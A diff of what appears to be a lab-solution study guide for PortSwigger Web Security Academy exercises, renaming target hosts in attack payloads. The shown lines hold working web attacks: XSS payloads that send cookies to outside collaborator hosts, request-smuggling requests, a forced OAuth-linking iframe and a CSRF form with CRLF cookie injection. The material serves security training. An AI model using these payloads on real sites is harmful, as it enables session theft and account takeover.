@@ -312,7 +312,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 >Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above methodology. This payload steal my own session cookie as POC.  
 
 ```
-https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
+https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2Fcollaboration.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E
 ```  
 
 >Place the above payload on exploit server and insert URL with search value into an **iframe** before delivering to victim in below code block.  
@@ -503,7 +503,7 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 >Hosting the **IFRAME** with eval() and fetch() payload on exploit server, respectively base64 encoded and URL encoded.  
 
 ```html
-<iframe src="https://TARGET.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
+<iframe src="https://TARGET.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
 ```
 ![(Deliver reflected xss to steal victim cookie.](images/xss1.png)  
 
@@ -733,7 +733,7 @@ csrf=TheCSRFTokenValue&username=carlos
 
 ```
 POST / HTTP/1.1
-Host: TARGET.web-security-academy.net
+Host: TARGET.net
 Content-length: 4
 Transfer-Encoding: chunked
 
@@ -763,7 +763,7 @@ x=1
 
 ```html
 POST / HTTP/1.1
-Host: TARGET.web-security-academy.net
+Host: TARGET.net
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 242
 Transfer-Encoding: chunked
@@ -930,7 +930,7 @@ search=nutty
 
 ```html
 POST /x HTTP/2
-Host: TARGET.web-security-academy.net
+Host: TARGET.net
 Transfer-Encoding: chunked
 
 0
@@ -1094,7 +1094,7 @@ very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so
 >Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. **Drop** the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the ```src``` attribute points to the URL you just copied.  
 
 ```html
-<iframe src="https://TARGET.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
+<iframe src="https://TARGET.net/oauth-linking?code=STOLEN-CODE"></iframe>
 ```  
 
 [PortSwigger Lab: Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)  
@@ -1193,12 +1193,12 @@ history.pushState('', '', '/');
 <html>
   <body>
     <script>history.pushState('', '', '/')</script>
-    <form action="https://TARGET.web-security-academy.net/my-account/change-email" method="POST">
+    <form action="https://TARGET.net/my-account/change-email" method="POST">
       <input type="hidden" name="email" value="hacker&#64;exploit&#45;0a18002e03379f0ccf16180f01180022&#46;exploit&#45;server&#46;net" />
       <input type="hidden" name="csrf" value="48hizVRa9oJ1slhOIPljozUAjqDMdplb" />
       <input type="submit" value="Submit request" />
     </form>
-	<img src="https://TARGET.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None" onerror="document.forms[0].submit()">    
+	<img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=NvKm20fiUCAySRSHHSgH7hwonb21oVUZ%3b%20SameSite=None" onerror="document.forms[0].submit()">    
   </body>
 </html>
 ```  
